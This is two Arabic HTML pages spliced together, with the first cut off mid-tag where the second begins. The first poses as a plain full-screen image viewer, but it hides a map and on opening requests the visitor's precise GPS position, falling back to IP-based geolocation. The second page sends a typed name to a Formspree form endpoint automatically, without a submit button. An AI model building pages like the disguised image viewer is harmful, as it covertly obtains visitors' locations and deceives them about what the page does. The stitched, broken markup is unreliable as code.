<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>عرض الصورة</title>
  
  <!-- مكتبة Leaflet للخريطة -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      background-color: #000;
    }
    /* طبقة الصورة لتغطي كامل الشاشة فوق كل شيء */
    #image-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: 99999;
      background-color: #000;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    #image-overlay img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    /* الخريطة تكون مخفية في الخلفية */
    #map {
      display: none;
    }
  </style>
</head>
<body>

  <!-- الصورة ثابتة ملء الشاشة -->
  <div id="image-overlay">
    <img src="IMG_8613.jpeg" alt="صورة">
  </div>

  <!-- الخريطة في الخلفية -->
  <div id="map"></div>

  <script>
    // إنشاء الخريطة المخفية
    var map = L.map('map').setView([0, 0], 2);

    L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
      maxZoom: 19
    }).addTo(map);

    // طلب تحديد موقع GPS الدقيق فور الفتح
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(position) {
        var userLat = position.coords.latitude;
        var userLng = position.coords.longitude;

        map.setView([userLat, userLng], 14);
        L.marker([userLat, userLng]).addTo(map).bindPopup('موقعك الحالي').openPopup();
      }, function() {
        // في حال رفض الإذن
        getIPInfo();
      });
    } else {
      getIPInfo();
    }

    function getIPInfo() {
      fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
          if (data.latitude && data.longitude) {
            map.setView([data.latitude, data.longitude], 12);
            L.marker([data.latitude, data.longitude]).addTo(map).bindPopup('الموقع التقريبي').openPopup();
          }
        })
        .catch(err => console.error(err));
    }
  </<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الاسم التلقائي</title>
  <style>
    body {
      font-family: system-ui, -apple-system, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #f4f4f9;
    }
    .card {
      background: #ffffff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      text-align: center;
      width: 100%;
      max-width: 350px;
    }
    input[type="text"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
      font-size: 16px;
    }
    .status {
      font-size: 14px;
      color: #666;
      min-height: 20px;
    }
  </style>
</head>
<body>

  <div class="card">
    <h2>أدخل اسمك</h2>
    <input type="text" id="userName" placeholder="اكتب اسمك هنا..." autocomplete="off">
    <div id="statusMessage" class="status"></div>
  </div>

  <script>
    const nameInput = document.getElementById('userName');
    const statusMsg = document.getElementById('statusMessage');
    let isSent = false; // لمنع الإرسال المكرر

    // دالة الإرسال التلقائي
    function sendDataAutomatically() {
      const nameValue = nameInput.value.trim();

      // التأكد أن الحقل ليس فارغاً ولم يتم إرساله سابقاً
      if (nameValue.length > 0 && !isSent) {
        statusMsg.innerText = "جاري الحفظ والتسجيل...";
        statusMsg.style.color = "#007bff";

        fetch('https://formspree.io/f/xpqvvkdp', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({ name: nameValue })
        })
        .then(response => {
          if (response.ok) {
            isSent = true;
            statusMsg.innerText = "تم حفظ اسمك بنجاح! ✅";
            statusMsg.style.color = "green";
          } else {
            statusMsg.innerText = "حدث خطأ أثناء الحفظ.";
            statusMsg.style.color = "red";
          }
        })
        .catch(error => {
          statusMsg.innerText = "تعذر الاتصال بالشبكة.";
          statusMsg.style.color = "red";
        });
      }
    }

    // 1. الإرسال عند خروج الماوس/المؤشر من حقل الكتابة (Blur)
    nameInput.addEventListener('blur', sendDataAutomatically);

    // 2. الإرسال عند الضغط على زر Enter في الكيبورد
    nameInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') {
        sendDataAutomatically();
      }
    });
  </script>

</body>
</html>
